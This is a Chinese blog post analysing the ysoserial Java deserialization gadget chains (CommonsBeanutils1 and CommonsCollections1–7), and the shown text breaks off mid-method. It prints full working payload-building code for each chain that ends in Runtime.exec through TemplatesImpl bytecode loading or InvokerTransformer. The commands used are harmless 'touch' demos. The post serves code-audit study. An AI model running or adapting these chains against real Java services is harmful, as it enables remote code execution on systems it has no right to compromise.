com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javassist.*; import org.apache.commons.beanutils.BeanComparator; public class CommonsBeanutils1 { public static class AbstractTransletExt extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public AbstractTransletExt() { super(); System.out.println(\"CommonsBeanutils1\"); } } public static TemplatesImpl getTemplateImpl() throws Exception { TemplatesImpl obj = new TemplatesImpl(); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTransletExt.class)); CtClass clazz = pool.get(AbstractTransletExt.class.getName()); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazz.toBytecode()}); setFieldValue(obj, \"_name\", \"asdf\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); return obj; } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl template = getTemplateImpl();//生成待调用的TemplatesImpl BeanComparator comparator = new BeanComparator();//生成比较器BeanComparator供PriorityQueue使用 PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator);//生成PriorityQueue并调用BeanComparator进行比较 queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\");//设置BeanComparator比较函数为TemplatesImpl中的getOutputProperties setFieldValue(queue, \"queue\", new Object[]{template, template});//写入TemplatesImpl Path path = Paths.get(\"/tmp/CommonsBeanutils1.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(queue); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } } ","date":"2022-10-10","objectID":"/ysoserial/:5:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"PriorityQueue分析 PriorityQueue会对队列中的元素用比较器Comparator进行排序,利用链中PriorityQueue使用的是CommonsBeanutils中的比较器BeanComparator 分析PriorityQueue#readObject 函数调用栈为readObject-\u003eheapify-\u003esiftDown-\u003esiftDownUsingComparator-\u003ecomparator.compare private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); queue = new Object[size]; for (int i = 0; i \u003c size; i++) queue[i] = s.readObject(); heapify(); } private void heapify() { for (int i = (size \u003e\u003e\u003e 1) - 1; i \u003e= 0; i--) siftDown(i, (E) queue[i]); } private void siftDown(int k, E x) { if (comparator != null)//comparator指向CommonsBeanutils的比较器BeanComparator siftDownUsingComparator(k, x); else siftDownComparable(k, x); } private void siftDownUsingComparator(int k, E x) { int half = size \u003e\u003e\u003e 1; while (k \u003c half) { int child = (k \u003c\u003c 1) + 1; Object c = queue[child]; int right = child + 1; if (right \u003c size \u0026\u0026 comparator.compare((E) c, (E) queue[right]) \u003e 0) c = queue[child = right]; if (comparator.compare(x, (E) c) \u003c= 0)//调用CommonsBeanutils中的BeanComparator#compare break; queue[k] = c; k = child; } queue[k] = x; } ","date":"2022-10-10","objectID":"/ysoserial/:5:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsBeanutils分析 在PriorityQueue#siftDownUsingComparator进入BeanComparator#compare,在PropertyUtils.getProperty通过反射调用getOutputProperties 最终进入newTransformer完成字节码的加载与实例化 public int compare(T o1, T o2) {//o1和o2均为TemplatesImpl if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property);//this.property为outputProperties Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } ... } } getProperty演示 import org.apache.commons.beanutils.PropertyUtils; import java.lang.reflect.InvocationTargetException; public class GetPropertyDemo { public static class pro { private String name = \"pro\"; public String getName(){ System.out.println(name); return name; } } public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { PropertyUtils.getProperty(new pro(),\"name\"); } } 因此PropertyUtils.getProperty(o1, this.property)实际执行的是TemplatesImpl#getoutputProperties public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties();//进入TemplatesImpl#newTransformer,后续利用与前面的利用TemplatesImpl加载字节码一致 } catch (TransformerConfigurationException e) { return null; } } CommonsBeanutils利用成功 ","date":"2022-10-10","objectID":"/ysoserial/:5:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections1分析 将JDK版本降低到7u80 public class CommonsCollections1 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] { \"touch /tmp/CommonsCollections1\" }) }; Transformer chainedTransformer = new ChainedTransformer(transformers); Map hashMap = new HashMap(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); Class AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap); Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] { Map.class }, handler);// 生成代理对象 handler = (InvocationHandler) constructor.newInstance(Retention.class, map); // map.size();//调用代理对象的任意方法从而调用invoke方法 Path path = Paths.get(\"/tmp/CommonsCollections1.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(handler); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();// 模拟反序列化 } } ","date":"2022-10-10","objectID":"/ysoserial/:6:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"InvokerTransformer分析 package org.apache.commons.collections.functors; import java.io.Serializable; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import org.apache.commons.collections.FunctorException; import org.apache.commons.collections.Transformer; public class InvokerTransformer implements Transformer, Serializable { private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } } } 在transform方法通过反射调用任意对象的任意方法 public class InvokerTransformerDemo { public static void main(String[] args) { InvokerTransformer transformer = new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[] { \"touch /tmp/InvokerTransformerDemo\" }); transformer.transform(Runtime.getRuntime()); } } ","date":"2022-10-10","objectID":"/ysoserial/:6:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"ChainedTransformer分析 final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; //org.apache.commons.collections.functors public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers; } public Object transform(Object object) { for (int i = 0; i \u003c iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } ChainedTransformer#transform对传入的参数使用iTransformers[i].transform进行处理,并将处理的结果作为下一次调用的参数 因此将iTransformers设置为InvokerTransformer的数组,即可利用InvokerTransformer#transform进行反射调用 通过ConstantTransformer获取Runtime.class //org.apache.commons.collections.functors public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn; } public Object transform(Object input) { return iConstant; } 通过InvokerTransformer调用invoke,对Runtime.class执行getMethod(\"getRuntime\")获取Runtime.class.getRuntime方法实例 通过InvokerTransformer调用invoke执行Runtime.class.getRuntime获取Runtime实例 通过InvokerTransformer调用invoke执行exec方法,达到命令执行的目的 InvokerTransformer调用流程可归纳如下 Runtime rt = (Runtime) Runtime.class.getMethod(\"getRuntime\").invoke(null); rt.exec(\"command\"); Demo演示 public class ChainedTransformerDemo { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"touch /tmp/ChainedTransformerDemo\"}) }; Transformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); } } ","date":"2022-10-10","objectID":"/ysoserial/:6:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"LazyMap分析 通过LazyMap#decorate将ChainedTransformer设置为factory变量,通过LazyMap#get方法调用factory#transform从而进入ChainedTransformer#transform 而调用LazyMap#get则是通过后续的动态代理进行 final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //org.apache.commons.collections.map public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } this.factory = factory; } public Object get(Object key) { if (map.containsKey(key) == false) { Object value = factory.transform(key);//进入ChainedTransformer#transform map.put(key, value); return value; } return map.get(key); } ","date":"2022-10-10","objectID":"/ysoserial/:6:3","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"动态代理 在AnnotationInvocationHandler#invoke中可以通过this.memberValues.get(var4)来调用LazyMap#get 而this.memberValues可控,在构造函数中通过var2进行设置 Class AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap); Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] { Map.class }, handler);// 生成代理对象 handler = (InvocationHandler) constructor.newInstance(Retention.class, map); //sun.reflect.annotation class AnnotationInvocationHandler implements InvocationHandler, Serializable { private final Class\u003c? extends Annotation\u003e type; private final Map\u003cString, Object\u003e memberValues; private transient volatile Method[] memberMethods = null; AnnotationInvocationHandler(Class\u003c? extends Annotation\u003e var1, Map\u003cString, Object\u003e var2) {//var1必须为注解类型,且该构造函数不是public,因此通过反射构建对象 Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026\u0026 var3.length == 1 \u0026\u0026 var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } } public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") \u0026\u0026 var5.length == 1 \u0026\u0026 var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else if (var5.length != 0) { throw new AssertionError(\"Too many parameters for an annotation method\"); } else { switch (var4) { case \"toString\": return this.toStringImpl(); case \"hashCode\": return this.hashCodeImpl(); case \"annotationType\": return this.type; default: Object var6 = this.memberValues.get(var4); ... } } } } ","date":"2022-10-10","objectID":"/ysoserial/:6:4","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"反序列化 通过readObject中的var4.entrySet()进入动态代理,调用AnnotationInvocationHandler#invoke,从而完成整条反序列化链 用java8运行会报错Exception in thread \"main\" java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet 因此需要将JDK版本降低到7u80 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { ObjectInputStream.GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(\"type\", (Object)null); Map var4 = (Map)var2.get(\"memberValues\", (Object)null); AnnotationType var5 = null; try { var5 = AnnotationType.getInstance(var3); } catch (IllegalArgumentException var13) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) { ... } } ","date":"2022-10-10","objectID":"/ysoserial/:6:5","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections2分析 与CommonsBeanutils1类似,通过PriorityQueue反序列化的时候会对队列中的元素使用比较器的compare方法去处理 CC2使用org.apache.commons.collections4.comparators.TransformingComparator#compare进行比较 利用payload public static void main(String[] args) throws Exception { TemplatesImpl templates = getTemplateImpl();//生成待调用的TemplatesImpl InvokerTransformer transformer = new InvokerTransformer(\"toString\", null, null); TransformingComparator comparator = new TransformingComparator(transformer); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(1); queue.add(1); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); setFieldValue(queue, \"queue\", new Object[]{templates, templates});//写入TemplatesImpl Path path = Paths.get(\"CommonsCollections2.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(queue); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } ","date":"2022-10-10","objectID":"/ysoserial/:7:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"TransformingComparator分析 package org.apache.commons.collections4.comparators; import java.io.Serializable; import java.util.Comparator; import org.apache.commons.collections4.ComparatorUtils; import org.apache.commons.collections4.Transformer; public class TransformingComparator\u003cI, O\u003e implements Comparator\u003cI\u003e, Serializable { private final Comparator\u003cO\u003e decorated; private final Transformer\u003c? super I, ? extends O\u003e transformer; public TransformingComparator(final Transformer\u003c? super I, ? extends O\u003e transformer, final Comparator\u003cO\u003e decorated) { this.decorated = decorated; this.transformer = transformer; } public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1);//this.transformer指向org.apache.commons.collections4.functors.InvokerTransformer final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); } } ","date":"2022-10-10","objectID":"/ysoserial/:7:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"InvokerTransformer分析 通过transform函数实现调用任意类的任意方法,通过TemplatesImpl的newTransformer达到rce package org.apache.commons.collections4.functors; import java.io.Serializable; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import org.apache.commons.collections4.FunctorException; import org.apache.commons.collections4.Transformer; public class InvokerTransformer\u003cI, O\u003e implements Transformer\u003cI, O\u003e, Serializable { private final String iMethodName; private final Class\u003c?\u003e[] iParamTypes; private final Object[] iArgs; public InvokerTransformer(final String methodName, final Class\u003c?\u003e[] paramTypes, final Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes != null ? paramTypes.clone() : null; iArgs = args != null ? args.clone() : null; } public O transform(final Object input) { try { final Class\u003c?\u003e cls = input.getClass();//获取input对象的类,input在利用链中被设置为TemplatesImpl final Method method = cls.getMethod(iMethodName, iParamTypes);//获得input对象的某个方法,由iMethodName指定,在poc中将iMethodName设置为newTransformer return (O) method.invoke(input, iArgs);//函数调用,即TemplatesImpl#newTransformer,进入TemplatesImpl的利用流程 } } } ","date":"2022-10-10","objectID":"/ysoserial/:7:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections3分析 与CC1的利用链类似,主要区别在于ChainedTransformer所使用的数组不同,同样使用jdk7u80进行复现 public class CommonsCollections3 { public static class AbstractTransletExt extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public AbstractTransletExt() { super(); System.out.println(\"CommonsCollections3\"); } } public static TemplatesImpl getTemplateImpl() throws Exception { TemplatesImpl obj = new TemplatesImpl(); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTransletExt.class)); CtClass clazz = pool.get(AbstractTransletExt.class.getName()); setFieldValue(obj, \"_bytecodes\", new byte[][] { clazz.toBytecode() }); setFieldValue(obj, \"_name\", \"asdf\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); return obj; } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl templateImpl = getTemplateImpl(); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templateImpl }), }; Transformer chainedTransformer = new ChainedTransformer(transformers); Map hashMap = new HashMap(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); Class AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap); Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] { Map.class }, handler); handler = (InvocationHandler) constructor.newInstance(Retention.class, map); Path path = Paths.get(\"/tmp/CommonsCollections3.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(handler); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();// 模拟反序列化 } } ","date":"2022-10-10","objectID":"/ysoserial/:8:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"TrAXFilter分析 InstantiateTransformer#transform对TrAXFilter使用传入的参数进行实例化 TrAXFilter在实例化时会对传入的templates调用newTransformer进行处理,从而实现加载字节码 //org.apache.commons.collections.functors public InstantiateTransformer(Class[] paramTypes, Object[] args) { super(); iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { try { if (input instanceof Class == false) { ... } Constructor con = ((Class) input).getConstructor(iParamTypes);//获取Constructor对象,input为TrAXFilter return con.newInstance(iArgs);//对TrAXFilter使用templateImpl进行实例化 } } //com.sun.org.apache.xalan.internal.xsltc.trax public TrAXFilter(Templates templates) throws TransformerConfigurationException { _templates = templates; _transformer = (TransformerImpl) templates.newTransformer();//进入TemplatesImpl的RCE利用过程 _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); } ","date":"2022-10-10","objectID":"/ysoserial/:8:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonCollections4分析 与CC3链类似 public static void main(String[] args) throws Exception { TemplatesImpl templateImpl = getTemplateImpl(); ConstantTransformer constantTransformer = new ConstantTransformer(String.class); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class}, new Object[]{\"\"}); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{constantTransformer, instantiateTransformer}); PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, new TransformingComparator(chainedTransformer)); queue.add(1); queue.add(1); setFieldValue(constantTransformer, \"iConstant\", TrAXFilter.class); setFieldValue(instantiateTransformer, \"iParamTypes\", new Class[]{Templates.class}); setFieldValue(instantiateTransformer, \"iArgs\", new Object[]{templateImpl}); Path path = Paths.get(\"CommonsCollections4.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(queue); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } 通过PriorityQueue#siftDownUsingComparator调用TransformingComparator#compare,然后进入到ChainedTransformer#transform,后续流程与CC3一致 public TransformingComparator(final Transformer\u003c? super I, ? extends O\u003e transformer) { this(transformer, ComparatorUtils.NATURAL_COMPARATOR); } public TransformingComparator(final Transformer\u003c? super I, ? extends O\u003e transformer, final Comparator\u003cO\u003e decorated) { this.decorated = decorated; this.transformer = transformer; } public int compare(final I obj1, final I obj2) {//被PriorityQueue#siftDownUsingComparator中的comparator.compare调用 final O value1 = this.transformer.transform(obj1);//this.transformer为ChainedTransformer,因此进入ChainedTransformer#transform,后续流程与CC3一致 final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); } ","date":"2022-10-10","objectID":"/ysoserial/:9:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections5分析 与CC1类似,但反序列化的入口不同 public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"touch /tmp/CommonsCollections5\"}) }; Transformer chainedTransformer = new ChainedTransformer(transformers); Map hashMap = new HashMap(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); setFieldValue(val,\"val\",tiedMapEntry); // setFieldValue(chainedTransformer, \"iTransformers\", transformers); Path path = Paths.get(\"/tmp/CommonsCollections5.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(val); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } ","date":"2022-10-10","objectID":"/ysoserial/:10:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"BadAttributeValueExpException分析 通过反射将val设置为TiedMapEntry对象,当满足条件System.getSecurityManager() == null时,调用TiedMapEntry#toString //javax.management public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || ...) { val = valObj.toString(); } ... } ","date":"2022-10-10","objectID":"/ysoserial/:10:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"TiedMapEntry分析 TiedMapEntry的map设置为lazyMap,在toString方法中通过getValue调用lazyMap#get,后续流程与cc1一致 public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } public Object getKey() { return key; } public Object getValue() { return map.get(key); } public String toString() { return getKey() + \"=\" + getValue(); } ","date":"2022-10-10","objectID":"/ysoserial/:10:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections6分析 与CC5类似,但入口点从BadAttributeValueExpException换成HashSet public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"touch /tmp/CommonsCollections6\"}) }; Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});//不是直接使用transformers进行初始化 Map hashMap = new HashMap(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"\"); HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); hashMap.clear(); setFieldValue(chainedTransformer, \"iTransformers\", transformers); Path path = Paths.get(\"/tmp/CommonsCollections6.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(hashSet); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } ","date":"2022-10-10","objectID":"/ysoserial/:11:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"HashSet分析 反序列化进入HashSet#readObject,调用HashMap#put对TiedMapEntry进行处理 //java.util.HashSet private transient HashMap\u003cE,Object\u003e map; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { ... map = (((HashSet\u003c?\u003e)this) instanceof LinkedHashSet ? new LinkedHashMap\u003cE,Object\u003e(capacity, loadFactor) : new HashMap\u003cE,Object\u003e(capacity, loadFactor)); for (int i=0; i\u003csize; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } } //java.util.HashMap static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 进入TiedMapEntry#hashCode,然后通过getValue方法执行lazyMap#get,后续流程与CC1一致 //org.apache.commons.collections.keyvalue.TiedMapEntry public Object getValue() { return map.get(key); } public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } ","date":"2022-10-10","objectID":"/ysoserial/:11:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"与CC5的不同点 CC5是直接使用Transformer数组对ChainedTransformer进行初始化,而CC6先使用空数组初始化,然后通过反射修改ChainedTransformer中的值 因为hashSet.add(tiedMapEntry);这一步骤会造成干扰,HashSet#add同样会调用HashMap#put,会导致触发Transformer数组中的命令 同时HashMap#put会进行putVal操作,如果不进行hashMap.clear();会导致在LazyMap#get方法中不满足map.containsKey(key) == false条件,导致无法触发命令 //java.util.HashSet public boolean add(E e) { return map.put(e, PRESENT)==null; } public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } //org.apache.commons.collections.map.LazyMap public Object get(Object key) { if (map.containsKey(key) == false) {//前提条件,在进行hashSet.add(tiedMapEntry)后会不满足,因此通过hashMap.clear()进行清除 Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } ","date":"2022-10-10","objectID":"/ysoserial/:11:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsCollections7分析 public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"touch /tmp/CommonsCollections7\"}) }; Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); setFieldValue(chainedTransformer, \"iTransformers\", transformers); lazyMap2.remove(\"yy\"); Path path = Paths.get(\"/tmp/CommonsCollections7.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(hashtable); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();//模拟反序列化 } ","date":"2022-10-10","objectID":"/ysoserial/:12:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"Hashtable分析 reconstitutionPut方法是Hashtable#readObject所使用的put方法,Hashtable在哈希表中存储键值对,因此在readObject恢复哈希表时会对键的hashCode和key进行校验 //java.util.Hashtable private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ... for (; elements \u003e 0; elements--) { K key = (K)s.readObject(); V value = (V)s.readObject(); reconstitutionPut(table, key, value); } } private void reconstitutionPut(Entry\u003c?,?\u003e[] tab, K key, V value) throws StreamCorruptedException { ... int hash = key.hashCode(); int index = (hash \u0026 0x7FFFFFFF) % tab.length; for (Entry\u003c?,?\u003e e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026\u0026 e.key.equals(key)) {//关键逻辑 throw new java.io.StreamCorruptedException(); } } Entry\u003cK,V\u003e e = (Entry\u003cK,V\u003e)tab[index]; tab[index] = new Entry\u003c\u003e(hash, key, value, e); count++; } (e.hash == hash)分析 根据payload,Hashtable的两个键均为LazyMap类型,首先通过key.hashCode()计算键的hashCode即LazyMap#hashCode public class LazyMap extends AbstractMapDecorator implements Map, Serializable{} public abstract class AbstractMapDecorator implements Map { protected transient Map map; public int hashCode() { return map.hashCode(); } } public abstract class AbstractMap\u003cK,V\u003e implements Map\u003cK,V\u003e { public int 